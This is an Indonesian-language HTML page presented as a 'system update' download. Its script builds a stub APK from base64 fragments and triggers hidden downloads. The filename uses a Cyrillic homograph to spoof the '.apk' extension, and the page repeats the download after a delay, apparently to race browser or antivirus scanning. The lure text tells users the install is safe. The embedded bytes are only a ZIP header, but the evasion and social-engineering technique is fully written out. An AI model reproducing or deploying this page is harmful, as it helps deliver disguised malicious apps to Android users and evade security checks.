<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Direct APK Race Condition Dispatcher</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #090d16;
    color: #f8fafc;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  .panel {
    background: #111827;
    padding: 32px;
    border-radius: 16px;
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.7);
    max-width: 520px;
    width: 100%;
    border: 1px solid #1f2937;
    text-align: center;
  }
  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; }
  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
  button {
    width: 100%;
    padding: 16px;
    cursor: pointer;
    border: none;
    border-radius: 10px;
    background: #2563eb;
    color: #ffffff;
    font-weight: 600;
    font-size: 16px;
    box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
    transition: all 0.2s ease;
  }
  button:hover { background: #1d4ed8; }
  #status {
    margin-top: 20px;
    font-weight: 500;
    color: #38bdf8;
    padding: 14px;
    background: rgba(56, 189, 248, 0.1);
    border-radius: 8px;
    font-size: 13px;
    border: 1px solid rgba(56, 189, 248, 0.2);
  }
</style>
</head>
<body>

<div class="panel">
  <h2>Direct APK Stream Dispatcher</h2>
  <p>Klik tombol di bawah untuk menginisialisasi paket instalasi aplikasi sistem secara aman.</p>
  <button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>
  <div id="status" role="status">Sistem siap.</div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

// Header biner APK (ZIP Signature: PK..)
const payloadFragments = [
  "UEs",
  "DBBQ",
  "AAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assemblePayload = () => payloadFragments.join("");

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const executeDirectApkRace = () => {
  try {
    const bytesArr = decodeBase64ToBytes(assemblePayload());
    
    // Blob secara mutlak menggunakan MIME type paket aplikasi Android
    const apkBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
    const apkUrl = URL.createObjectURL(apkBlob);

    const link = document.createElement("a");
    link.href = apkUrl;
    
    // Menggunakan homograph spoofing pada ekstensi .apk asli (huruf 'a' diganti Cyrillic 'а')
    const homographApkExt = "\u0430pk";
    link.download = `system-patch-update.${homographApkExt}`;
    link.style.display = "none";
    document.body.appendChild(link);

    statusDiv.textContent = "[RACE] Memicu pendaftaran stream APK awal...";
    link.click();

    // Jendela waktu (timing window) untuk memperbarui stream atau atribut saat pemindaian berlangsung
    setTimeout(() => {
      statusDiv.textContent = "[RACE] Menyegarkan referensi aliran data biner...";
      
      // Regenerasi Blob URL biner APK baru untuk menguji perilaku antrean unduhan
      const freshBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
      const freshUrl = URL.createObjectURL(freshBlob);

      link.href = freshUrl;
      link.download = `system-patch-stable.${homographApkExt}`;
      link.click();

      setTimeout(() => {
        URL.revokeObjectURL(apkUrl);
        URL.revokeObjectURL(freshUrl);
        statusDiv.textContent = "[RACE] Transmisi paket biner selesai.";
      }, 1200);

    }, 400);

  } catch (err) {
    statusDiv.textContent = "Error: " + err.message;
  }
};

startBtn.addEventListener("click", () => {
  statusDiv.textContent = "Menyiapkan parameter paket biner...";
  setTimeout(executeDirectApkRace, 200);
});
</script>
</body>
</html>
